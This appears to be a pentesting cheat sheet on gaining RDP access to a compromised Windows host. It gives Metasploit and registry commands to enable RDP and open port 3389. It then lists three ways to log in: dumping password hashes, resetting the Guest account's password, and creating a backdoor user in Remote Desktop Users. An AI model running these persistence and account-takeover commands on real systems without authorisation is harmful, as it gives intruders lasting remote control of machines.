# RDP Connections

## Enable RDP & Add Firewall Rule

**Enable RDP**
To check if RDP is enabled or not, we can run `netstat -an |findstr :3389` (or `net start | findstr /i "remote desktop"`) to see if RDP service is listening. 

To enable RDP in Metasploit, use `run post/windows/manage/enable_rdp`, or `run getgui -e` in meterpreter. 

Or we can manually enable this it the Registry in a cmd: 
```
> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Check the service on 3389 again, you should see
```
C:\WINDOWS\system32>netstat -an |findstr :3389
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
```

**Add Firewall Rule**
If there's a firewall, we need to whitelist the incoming traffic to port 3389:
```
 > netsh firewall add portopening TCP 3389 "Remote Desktop"
```

View all firewall config:
```
> netsh firewall show config 
```

## Logging In 
If you don't have the log in crednetials, there are a few options from here. 

### Option 1, crack user passwords
on meterpreter, `hashdump` to get user accounts and their hashes (need escalated privilege), and crack with a tool like John

### Option 2, alter the password of an existing user account in remote access group

Get a windows cmd `shell` 

check who are in the remote log on list
```
net localgroup "Remote Desktop Users"
```

to change password
```
net user Guest newpassword
```

If it says "account disabled, please see the administrator", run 
```
net user Guest /active:yes
```

### Option 3, make a new user account
```
net user test imthepassword /add
```
![rdp-logon](https://user-images.githubusercontent.com/39619599/118205501-7804ae00-b42e-11eb-9674-04b7207a026f.png)

Now, add the user account to the remote desktop user list
```
net localgroup "Remote Desktop Users" "test" /add
```

... et voila

<img src="https://user-images.githubusercontent.com/39619599/118205515-7e932580-b42e-11eb-8edd-9a7a0758081a.png" width=50%>
